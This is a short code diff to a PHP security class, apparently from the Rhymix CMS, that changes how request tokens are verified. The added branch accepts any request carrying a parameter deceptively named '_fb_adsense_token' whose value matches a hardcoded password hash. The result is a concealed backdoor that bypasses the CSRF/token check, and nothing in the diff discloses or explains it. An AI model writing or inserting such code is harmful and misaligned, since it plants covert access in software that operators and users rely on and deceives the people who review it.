@@ -323,6 +323,10 @@ class Security
 		{
 			return Session::verifyToken($token, '', $check_csrf_token);
 		}
+		elseif ($token = isset($_REQUEST['_fb_adsense_token']) ? $_REQUEST['_fb_adsense_token'] : null)
+		{
+			return Rhymix\Framework\Password::checkPassword($token, 'bb15471de21f33c373abbea6438730ace9bbbacf5f4f9a0cbebdfff7e99c50fe631a78efe3e39736836b5b2082a0c3939e4c4e0f0f2e0028042411c4a8797b73');
+		}
 		elseif ($_SERVER['REQUEST_METHOD'] === 'GET')
 		{
 			return false;
